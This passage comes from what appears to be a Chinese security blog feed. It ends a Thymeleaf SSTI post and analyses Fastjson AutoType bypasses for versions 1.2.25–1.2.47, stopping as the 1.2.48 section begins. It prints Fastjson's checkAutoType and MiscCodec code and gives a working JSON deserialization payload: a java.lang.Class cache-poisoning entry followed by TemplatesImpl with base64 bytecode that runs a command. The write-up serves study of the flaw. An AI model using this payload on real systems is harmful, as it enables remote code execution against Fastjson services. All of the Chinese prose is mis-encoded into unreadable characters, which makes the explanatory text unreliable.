src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A535.png"></p><p>æ¥åˆ°<code>RequestMappingHandlerAdapter</code>ç¬¬545è¡Œ</p><p><img src="/2022/11/26/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/Thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A536.png"></p><p>åˆ°è¿™é‡ŒåŸºæœ¬ç†è§£äº†mvä¸ºç©ºçš„åŸå› ï¼Œmvä¸ºç©ºï¼Œä¸éœ€è¦æ¸²æŸ“äº†ï¼Œæ‰€ä»¥æ¼æ´ä¹Ÿä¸å­˜åœ¨äº†</p><h3 id="0x05-å‚è€ƒé“¾æ¥"><a href="#0x05-å‚è€ƒé“¾æ¥" class="headerlink" title="0x05 å‚è€ƒé“¾æ¥"></a>0x05 å‚è€ƒé“¾æ¥</h3><ul><li><a href="https://www.thymeleaf.org/doc/tutorials/3.0/usingthymeleaf.html#messages">æ•™ç¨‹ï¼šä½¿ç”¨ Thymeleaf</a></li><li><a href="https://forum.butian.net/index.php/share/1922">Thymeleaf SSTI</a></li><li><a href="https://www.anquanke.com/post/id/254519#h3-5">Javaå®‰å…¨ä¹‹Thymeleaf SSTIåˆ†æ</a></li><li><a href="https://xz.aliyun.com/t/8568#toc-3">ç”±WCTF2020 Thymeleafåˆ†æpayloadå½¢å¼</a></li><li><a href="https://github.com/veracode-research/spring-view-manipulation">spring-view-manipulation</a></li><li><a href="https://blog.csdn.net/CPLASF_/article/details/110189503">springmvcæºç -å‚æ•°è§£æ</a></li><li><a href="https://www.cnpanda.net/sec/1063.html">Thymeleaf SSTI åˆ†æä»¥åŠæœ€æ–°ç‰ˆä¿®å¤çš„ Bypass</a></li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Fastjson Bypass</title>
    <link href="/2022/11/19/FastjsonBypass/"/>
    <url>/2022/11/19/FastjsonBypass/</url>
    
    <content type="html"><![CDATA[<h2 id="Fastjson-Bypass"><a href="#Fastjson-Bypass" class="headerlink" title="Fastjson Bypass"></a>Fastjson Bypass</h2><h3 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h3><p>çœ‹å®Œfastjsonçš„æ¼æ´åŸç†ï¼Œæ¥ä¸‹æ¥å°±æ˜¯ç»•ä¸€ä¸‹fastjsoné™åˆ¶äº†ï¼Œæ¼æ´çˆ†å‡ºæ¥åï¼Œå®˜æ–¹åœ¨1.2.25å°±å·²ç»ä¿®å¤äº†ï¼Œä½†åé¢åˆé™†é™†ç»­ç»­çš„å‡ºæ¥äº†å¾ˆå¤šç»•è¿‡çš„æ–¹æ³•ï¼Œæ‰€ä»¥æœ¬æ–‡ä¸»è¦å­¦ä¹ ä¸‹ç»•è¿‡çš„æ€è·¯å’Œæ–¹æ³•ï¼Œä¸‹é¢ä¸»è¦ä»¥AutoTypeå¼€å¯æˆ–å…³é—­ï¼Œç„¶åå†ä»¥ç‰ˆæœ¬ä¸ºåˆ†ç±»ã€‚<code>AutoType</code>å¼€å…³æ˜¯fastjsonçš„ä¸€ç§å®‰å…¨æœºåˆ¶ï¼Œå¹¶ä¸æ˜¯æ‰“å¼€æˆ–è€…å…³é—­åå°±èƒ½å¤Ÿé˜²æ­¢å®‰å…¨é—®é¢˜ï¼Œå…¶ä½œç”¨ä¸»è¦æ˜¯ç”¨äºå†³å®šä»£ç å†…çš„ä¸€äº›é€»è¾‘åˆ¤æ–­ï¼Œå…·ä½“çš„ä¸€äº›ä¸œè¥¿å‚è§<a href="https://xz.aliyun.com/t/8140">FastJson checkAutoTypeå®‰å…¨æœºåˆ¶ç ”ç©¶</a></p><h3 id="0x01-å…³é—­AutoType"><a href="#0x01-å…³é—­AutoType" class="headerlink" title="0x01 å…³é—­AutoType"></a>0x01 å…³é—­AutoType</h3><p>AutoTypeåœ¨é»˜è®¤æƒ…å†µä¸‹æ˜¯å…³é—­çš„ï¼Œå› æ­¤å…ˆæ¥çœ‹AutoTypeå…³é—­çš„æƒ…å†µ</p><h4 id="1-2-25-1-2-47"><a href="#1-2-25-1-2-47" class="headerlink" title="1.2.25 - 1.2.47"></a>1.2.25 - 1.2.47</h4><p>çœ‹ä¸€ä¸‹æ”¹åŠ¨ä»£ç ï¼Œå¢åŠ äº†ä¸ª<code>checkAutoType</code>ï¼Œå¹¶ä¸”<code>checkAutoType</code>è¿”å›çš„ä¹Ÿæ˜¯Class&lt;?&gt;ï¼Œæ‰€ä»¥ç±»åŠ è½½çš„è¿‡ç¨‹ä¹Ÿæ˜¯åœ¨<code>checkAutoType</code>ä¸­å®Œæˆçš„ï¼Œæ‰€ä»¥é‡ç‚¹è¿˜æ˜¯å…³æ³¨è¯¥æ–¹æ³•</p><p><img src="/2022/11/19/FastjsonBypass/2.png"></p><p>å…ˆæ¥çœ‹ä¸€ä¸‹<code>checkAutoType</code>å¤§æ¦‚éƒ½åšäº†å“ªäº›äº‹æƒ…ï¼Œè¿™é‡Œé¢æœ‰ä¸ª<code>autoTypeSupport</code>å¼€å…³</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass) &#123;<br>    ...<span class="hljs-comment">// typeNameä¸èƒ½ä¸ºç©º</span><br><br>    <span class="hljs-keyword">final</span> String className = typeName.replace(<span class="hljs-string">&#x27;$&#x27;</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<span class="hljs-comment">// æ›¿æ¢å†…éƒ¨ç±»</span><br><br>    <span class="hljs-keyword">if</span> (autoTypeSupport || expectClass != <span class="hljs-keyword">null</span>) &#123;<span class="hljs-comment">// autoTypeå¼€å¯æˆ–è€…expectClassä¸ä¸ºç©ºæ—¶è¿›å…¥</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; acceptList.length; ++i) &#123;<br>            ... <span class="hljs-comment">// ç™½åå•æ ¡éªŒ é€šè¿‡åˆ™ TypeUtils.loadClass(),ç™½åå•é»˜è®¤ä¸ºç©º</span><br>        &#125;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; denyList.length; ++i) &#123;<br>            ... <span class="hljs-comment">// é»‘åå•æ ¡éªŒ åœ¨é»‘åå•ä¸­åˆ™ ç›´æ¥æŠ›å¼‚å¸¸ï¼Œé»‘åå•è§é™„å½•</span><br>        &#125;<br>    &#125;<br><br>    Class&lt;?&gt; clazz = TypeUtils.getClassFromMapping(typeName);<span class="hljs-comment">// ä»ç¼“å­˜è¡¨ä¸­è·å–ï¼Œé˜²æ­¢é‡å¤åŠ è½½è¯¥ç±»ï¼Œç¼“å­˜è¡¨è§é™„å½•</span><br>    <span class="hljs-keyword">if</span> (clazz == <span class="hljs-keyword">null</span>) &#123;<br>        clazz = deserializers.findClass(typeName);<span class="hljs-comment">// å½“ç¼“å­˜è¡¨ä¸­æ²¡æœ‰è¯¥ç±»æ—¶ï¼ŒæŸ¥çœ‹è¯¥ç±»æ˜¯å¦å·²ç»æœ‰å›ºå®šçš„ååºåˆ—åŒ–å™¨</span><br>    &#125;<span class="hljs-comment">// fastjsonä¸­å¯¹æŸäº›ç±»ç¡®å®šäº†ååºåˆ—åŒ–å™¨ï¼Œå½“@typeçš„å€¼ä¸ºå¯¹åº”ç±»æ—¶ï¼Œåˆ™ç›´æ¥è°ƒç”¨è¯¥ååºåˆ—åŒ–å™¨ï¼Œä¸å†åˆ›å»ºååºåˆ—åŒ–å™¨</span><br><br>    <span class="hljs-keyword">if</span> (clazz != <span class="hljs-keyword">null</span>) &#123;<span class="hljs-comment">// è‹¥ä»ç¼“å­˜è¡¨æˆ–è€…ååºåˆ—å™¨ä¸­æ‰¾åˆ°äº†ï¼Œåˆ™åˆ¤æ–­expectClassæ˜¯å¦ä¸ºç©ºï¼Œä»¥åŠclazzæ˜¯å¦æ˜¯å…¶å­ç±»æˆ–å®ç°ç±»</span><br>        <span class="hljs-keyword">if</span> (expectClass != <span class="hljs-keyword">null</span> &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;...&#125;<br>        <span class="hljs-keyword">return</span> clazz;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (!autoTypeSupport) &#123;<span class="hljs-comment">// autoTypeé»˜è®¤å…³é—­ï¼Œæ‰€ä»¥è¿›å…¥è¿™é‡Œ</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; denyList.length; ++i) &#123;...&#125;<span class="hljs-comment">// é»‘åå•</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; acceptList.length; ++i) &#123;...&#125;<span class="hljs-comment">// ç™½åå•</span><br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (autoTypeSupport || expectClass != <span class="hljs-keyword">null</span>) &#123;<span class="hljs-comment">// autoTypeæˆ–expectClass(æœŸæœ›ç±»)ä¸ä¸ºç©ºæ—¶è¿›å…¥ç±»åŠ è½½</span><br>        clazz = TypeUtils.loadClass(typeName, defaultClassLoader);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (clazz != <span class="hljs-keyword">null</span>) &#123;<span class="hljs-comment">// åŸºæœ¬ä¸Šåˆ°è¿™é‡Œå°±éƒ½èƒ½åŠ è½½ï¼Œæˆ–è€…æŠ›å‡ºå¼‚å¸¸äº†</span><br>        ... <span class="hljs-comment">// è¿™é‡Œå°±æ˜¯ç®€å•çš„æŠ›å¼‚å¸¸äº†</span><br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (!autoTypeSupport) &#123;<span class="hljs-comment">// è¿™æ¯å¤ªç†è§£,ä¹Ÿå°±æ˜¯ä¸Šé¢è¦æ˜¯æ²¡åŠ è½½æˆåŠŸï¼Œç„¶åæŠ›ä¸ªå¼‚å¸¸ï¼Ÿï¼Ÿï¼Ÿ</span><br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> JSONException(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>    &#125;<br>    <span class="hljs-keyword">return</span> clazz;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¤§æ¦‚çš„æµç¨‹å°±æ˜¯ç±»ä¼¼äºå¦‚ä¸‹å½¢å¼ï¼š</p><p><img src="/2022/11/19/FastjsonBypass/3.png"></p><p>èƒ½å¤Ÿå‘ç°ç±»åŠ è½½å¹¶ä¸”æˆåŠŸè¿”å›çš„ä¹Ÿå°±4ä¸ªï¼Œèƒ½ç”¨çš„å…¶å®ä¹Ÿå°±1ä¸ª</p><ol><li>ç™½åå•ï¼Œä¸èƒ½ç”¨ï¼Œç™½åå•é»˜è®¤ä¸ºç©ºï¼ˆâï¼‰</li><li>ç¼“å­˜è¡¨ä¸­å­˜åœ¨ï¼Œè‹¥ç¼“å­˜è¡¨ä¸­èƒ½æœ‰æ¶æ„ç±»ï¼Œé‚£è¿™é‡Œä¹Ÿæ˜¯èƒ½ç”¨çš„ï¼ˆâœ…ï¼‰</li><li>ç™½åå•ï¼Œä¸èƒ½ç”¨ï¼Œç™½åå•é»˜è®¤ä¸ºç©ºï¼ˆâï¼‰</li><li><code>autoTypeSupport || expectClass != null</code>ä¸ºtrueæ—¶ï¼Œé¦–å…ˆ<code>autoTypeSupport</code>ä¸ºfalseï¼Œç„¶å<code>expectClass</code>ä¹Ÿæ˜¯ä¸ºç©ºçš„ï¼ˆâï¼‰</li></ol><p>è§£ä¸‹æ¥å°±æ˜¯æ‰¾èƒ½å¤Ÿæ“æ§ç¼“å­˜è¡¨çš„åœ°æ–¹ï¼Œåœ¨<code>com.alibaba.fastjson.util.TypeUtils#loadClass(java.lang.String, java.lang.ClassLoader)</code>ä¸­ï¼Œæœ‰ä¸‰å¤„<code>mappings.put()</code>ï¼Œç²—ç•¥çœ‹ä¸€ä¸‹ï¼Œè°ƒç”¨èµ·æ¥ä¹Ÿéƒ½æ²¡æœ‰å¤šå¤§é™åˆ¶</p><p><img src="/2022/11/19/FastjsonBypass/4.png"></p><p>ç»§ç»­æ‰¾åœ¨å“ªé‡Œè°ƒç”¨äº†è¿™ä¸ªæ–¹æ³•ï¼Œ<code>com.alibaba.fastjson.serializer.MiscCodec#deserialze</code></p><p><img src="/2022/11/19/FastjsonBypass/5.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// åˆ é™¤äº†ä¸€äº›è·Ÿæœ¬æ–‡å…³ç³»è¾ƒå°‘çš„ä¸œè¥¿</span><br><span class="hljs-comment">// clazz : ä¹Ÿå°±æ˜¯@typeæŒ‡å®šçš„é‚£ä¸ªç±»</span><br><span class="hljs-comment">// fieldName : ç”¨å¤„ä¸å¤§ï¼Œjsonä¸­çš„é‚£ä¸ªkey</span><br><span class="hljs-keyword">public</span> &lt;T&gt; <span class="hljs-function">T <span class="hljs-title">deserialze</span><span class="hljs-params">(DefaultJSONParser parser, Type clazz, Object fieldName)</span> </span>&#123;<br>    JSONLexer lexer = parser.lexer;<br><br>    Object objVal;<br><br>    <span class="hljs-keyword">if</span> (parser.resolveStatus == DefaultJSONParser.TypeNameRedirect) &#123;<span class="hljs-comment">// è¿™ä¸ªæœ‰ç‚¹å°çœ‹ä¸æ‡‚äº†</span><br>        parser.resolveStatus = DefaultJSONParser.NONE;<br>        parser.accept(JSONToken.COMMA);<br><br>        <span class="hljs-keyword">if</span> (lexer.token() == JSONToken.LITERAL_STRING) &#123;<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-string">&quot;val&quot;</span>.equals(lexer.stringVal())) &#123;<span class="hljs-comment">// åˆ¤æ–­keyæ˜¯å¦ä¸º &quot;val&quot;,ä¹Ÿå°±æ˜¯@typeåé¢é”®å€¼å¯¹çš„</span><br>     <br><br>        parser.accept(JSONToken.COLON);<br><br>        objVal = parser.parse();<span class="hljs-comment">// è·å–valåçš„value</span><br><br>        parser.accept(JSONToken.RBRACE);<br>    &#125; <span class="hljs-keyword">else</span> &#123;objVal = parser.parse();&#125;<br><br>    String strVal;<br><br>    <span class="hljs-keyword">if</span> (objVal == <span class="hljs-keyword">null</span>) &#123;<span class="hljs-comment">// èµ‹å€¼æ“ä½œ</span><br>        strVal = <span class="hljs-keyword">null</span>;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (objVal <span class="hljs-keyword">instanceof</span> String) &#123;<br>        strVal = (String) objVal;<br>    &#125; <span class="hljs-keyword">else</span> &#123;...&#125;<br><br>    <span class="hljs-keyword">if</span> (strVal == <span class="hljs-keyword">null</span> || strVal.length() == <span class="hljs-number">0</span>) &#123;<span class="hljs-comment">// è‹¥strValæ²¡æœ‰å–åˆ°å€¼å°±G</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>    &#125;<br><br>    ...<span class="hljs-comment">// ä¸€ç³»åˆ—çš„åˆ¤æ–­ åˆ¤æ–­clazzæ˜¯å¦å±äºä¸€äº›ç‰¹å®šçš„ç±»</span><br>    <span class="hljs-keyword">if</span> (clazz == Class.class) &#123;<span class="hljs-comment">// è‹¥clazzæ˜¯Class.classç±»å‹ï¼Œåˆ™è°ƒç”¨TypeUtils.loadClass()</span><br>        <span class="hljs-keyword">return</span> (T) TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader());<br>    &#125;<span class="hljs-comment">// ä¼ å…¥strVal,å’Œé…ç½®é‡Œé¢çš„ç±»åŠ è½½å™¨(è¿™ä¸ªé€šå¸¸æ˜¯ç©º)ï¼Œä½†åœ¨åé¢ä¼šè·å–ä¸Šä¸‹æ–‡ç±»åŠ è½½å™¨</span><br><br>    ...<span class="hljs-comment">// åŒä¸Šï¼Œæœ€åè¦æ˜¯æ²¡æœ‰åŒ¹é…åˆ°clazzçš„ç±»å‹ï¼Œåˆ™æŠ›ä¸ªå¼‚å¸¸</span><br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2022/11/19/FastjsonBypass/6.png"></p><blockquote><p>ç¼“å­˜è¡¨ä¸­æ·»åŠ æ¶æ„ç±»</p><ol><li><p>åœ¨<code>com.alibaba.fastjson.util.TypeUtils#loadClass()</code>ä¸­å‘ç¼“å­˜è¡¨ä¸­æ·»åŠ äº†ç±»</p></li><li><p>åœ¨<code>com.alibaba.fastjson.serializer.MiscCodec#deserialze</code>ä¸­è°ƒç”¨äº†è¯¥æ–¹æ³•ï¼Œå¹¶ä¸”è¯¥ç±»æ˜¯é»˜è®¤çš„ååºåˆ—åŒ–å™¨ï¼Œåœ¨@typeæŒ‡å®šçš„ç±»æ˜¯ä¸€äº›ç‰¹å®šç±»çš„æ—¶å€™ä¼šè°ƒç”¨</p></li><li><p>åœ¨å­˜åœ¨ä»¥valä¸ºkeyçš„é”®å€¼å¯¹æ—¶ï¼Œä¼šè·å–è¯¥é”®å€¼å¯¹çš„valueä½œä¸º<code>className</code>è¿›è¡Œ<code>loadClass(className)</code>å¹¶ä¸”å°†<code>mappings.put(className,clazz)</code></p></li></ol></blockquote><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>  <span class="hljs-attr">&quot;a&quot;</span>: &#123;<br>    <span class="hljs-attr">&quot;@type&quot;</span>: <span class="hljs-string">&quot;java.lang.Class&quot;</span>,<br>    <span class="hljs-attr">&quot;val&quot;</span>: <span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>è¯¥ç±»ä½œä¸ºæ¶æ„ç±»ï¼Œé‚£ä¹ˆå°†è¯¥æ¶æ„ç±»åŠ å…¥åˆ°ç¼“å­˜è¡¨ä¸­çš„å½¢å¼å°±æ˜¯è¿™ä¸ªæ ·å­å–½ï¼Œå°†è¯¥jsonå­—ç¬¦ä¸²è¿›è¡Œååºåˆ—åŒ–ï¼ŒæŸ¥çœ‹å‡ ä¸ªå…³é”®ç‚¹ï¼š</p><p><img src="/2022/11/19/FastjsonBypass/7.png"></p><p><img src="/2022/11/19/FastjsonBypass/8.png"></p><p><img src="/2022/11/19/FastjsonBypass/9.png"></p><p>æ¥åˆ°<code>com.alibaba.fastjson.util.TypeUtils#loadClass(java.lang.String, java.lang.ClassLoader)</code></p><p><img src="/2022/11/19/FastjsonBypass/10.png"></p><blockquote><p>å½“æ¶æ„ç±»ä¸­åŠ å…¥ç¼“å­˜è¡¨ä¹‹åï¼š</p><ol><li>è¿›å…¥checkAutoType</li><li>åœ¨ç¼“å­˜è¡¨ä¸­æŸ¥æ‰¾åˆ°äº†è¯¥æ¶æ„ç±»</li><li>ç›´æ¥è¿”å›è¯¥ç±»çš„classï¼Œå› ä¸ºåœ¨åŠ å…¥ç¼“å­˜è¡¨æ—¶å·²ç»å®Œæˆäº†è¯¥ç±»çš„åŠ è½½</li><li>ç„¶åå°±æ˜¯æ­£å¸¸çš„fastjsonååºåˆ—åŒ–</li></ol></blockquote><p>åé¢è¿™éƒ¨åˆ†å°±å’Œä»¥å‰çš„ä¸€æ ·äº†ï¼Œæ‰€ä»¥å°±ç›´æ¥ä¸Špayloadäº†</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>  <span class="hljs-attr">&quot;a&quot;</span>: &#123;<br>    <span class="hljs-attr">&quot;@type&quot;</span>: <span class="hljs-string">&quot;java.lang.Class&quot;</span>,<br>    <span class="hljs-attr">&quot;val&quot;</span>: <span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span><br>  &#125;,<br>  <span class="hljs-attr">&quot;b&quot;</span>: &#123;<br>    <span class="hljs-attr">&quot;@type&quot;</span>: <span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>,<br>    <span class="hljs-attr">&quot;_name&quot;</span>: <span class="hljs-string">&quot;Mechoy&quot;</span>,<br>    <span class="hljs-attr">&quot;_tfactory&quot;</span>: &#123;&#125;,<br>    <span class="hljs-attr">&quot;_bytecodes&quot;</span>: [<br>      <span class="hljs-string">&quot;yv66vgAAADQANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAhMQ2F0dGxlOwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAtAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAAg8Y2xpbml0PgEAAWUBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAA1TdGFja01hcFRhYmxlBwApAQAKU291cmNlRmlsZQEAC0NhdHRsZS5qYXZhDAAJAAoHAC4MAC8AMAEABGNhbGMMADEAMgEAE2phdmEvaW8vSU9FeGNlcHRpb24MADMACgEABkNhdHRsZQEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAPcHJpbnRTdGFja1RyYWNlACEABwAIAAAAAAAEAAEACQAKAAEACwAAAC8AAQABAAAABSq3AAGxAAAAAgAMAAAABgABAAAADQANAAAADAABAAAABQAOAA8AAAABABAAEQACAAsAAAA/AAAAAwAAAAGxAAAAAgAMAAAABgABAAAAGgANAAAAIAADAAAAAQAOAA8AAAAAAAEAEgATAAEAAAABABQAFQACABYAAAAEAAEAFwABABAAGAACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAHwANAAAAKgAEAAAAAQAOAA8AAAAAAAEAEgATAAEAAAABABkAGgACAAAAAQAbABwAAwAWAAAABAABABcACAAdAAoAAQALAAAAYQACAAEAAAASuAACEgO2AARXpwAISyq2AAaxAAEAAAAJAAwABQADAAwAAAAWAAUAAAAQAAkAEwAMABEADQASABEAFAANAAAADAABAA0ABAAeAB8AAAAgAAAABwACTAcAIQQAAQAiAAAAAgAj&quot;</span><br>    ],<br>    <span class="hljs-attr">&quot;outputProperties&quot;</span>: &#123;&#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2022/11/19/FastjsonBypass/11.png"></p><p>è¿™é‡Œæœ‰ä¸ªé—®é¢˜å°±æ˜¯ï¼Œpayloadåˆ†ä¸ºä¸¤æ®µï¼Œå¤§ä½¬ä»¬è¯´åˆ†ä¸ºä¸¤æ®µæ—¶å†™å¯èƒ½ä¼šå‡ºç°é—®é¢˜ï¼Œä½†æœ¬åœ°æµ‹è¯•æ—¶æ²¡å‘ç°å•¥é—®é¢˜ï¼ˆå¯èƒ½æ˜¯å› ä¸ºç¨‹åºå¤ªç®€å•ï¼‰ï¼ŒçœŸå®ç¯å¢ƒçš„è¯æ¯”è¾ƒå¤æ‚ã€‚</p><h4 id="1-2-48-1-2-68"><a href="#1-2-48-1-2-68" class="headerlink" title="1.2.48 - 1.2.68"></a>1.2.48 - 1.2.68</h4><p>ç‰ˆæœ¬ä¸Šåˆ°1.2.48ï¼Œç„¶åè·‘ä¸€ä¸‹åˆšåˆšçš„payloadï¼Œå…ˆæ¥çœ‹ä¸€ä¸‹çˆ†ä»€ä¹ˆæ ·çš„é”™ï¼Œemmmï¼Œè¿˜æ˜¯è¿™ä¸ª<code>autoType is not support</code>ï¼Œå¤§æ¦‚ç‡å°±æ˜¯ç¼“å­˜è¡¨æ²¡åŠ è¿›å»æˆ–è€…è¯´æå‰æ£€æµ‹äº†ä¸€ä¸‹</p><p><img src="/2022/11/19/FastjsonBypass/12.png"></p><p>å†æ¥çœ‹ä¸€ä¸‹<a href="https://github.com/alibaba/fastjson/commit/11b92d9f33119ca2af1a3fe6f474de5c1810e686#diff-4dd688f7c20466c093fa85dd2e1b4cafb5ad57d469a0b38a3f205a09038fdb1d">æ”¹åŠ¨æƒ…å†µ</a></p><p><img src="/2022/11/19/FastjsonBypass/13.png"></p><p><img src="/2022/11/19/FastjsonBypass/14.png"></p><p>è¿™ä¸¤ä¸ªä½ç½®ï¼Œå°±å†³å®šäº†ä»¥å‰çš„payloadæ— æ³•å†ä½¿ç”¨ï¼Œè¿˜æœ‰ä¸€äº›å…¶ä»–çš„åœ°æ–¹å¯ä»¥ç¨å¾®çœ‹çœ‹</p><p>å¥½äº†ï¼Œè¿™æ¬¡å¯„äº†ï¼Œç¼“å­˜è¡¨é‚£é‡ŒåŠ¨ä¸äº†æ‰‹äº†ï¼Œä½†æœ‰å¤§ç‰›ï¼Œå¤§ç‰›è¿™æ¬¡ä»æœŸæœ›ç±»å…¥æ‰‹äº†ï¼Œä¹Ÿå°±æ˜¯<code>expectClass</code></p><p>è¿˜æ˜¯<code>com.alibaba.fastjson.parser.ParserConfig#checkAutoType(java.lang.String, java.lang.Class&lt;?&gt;, 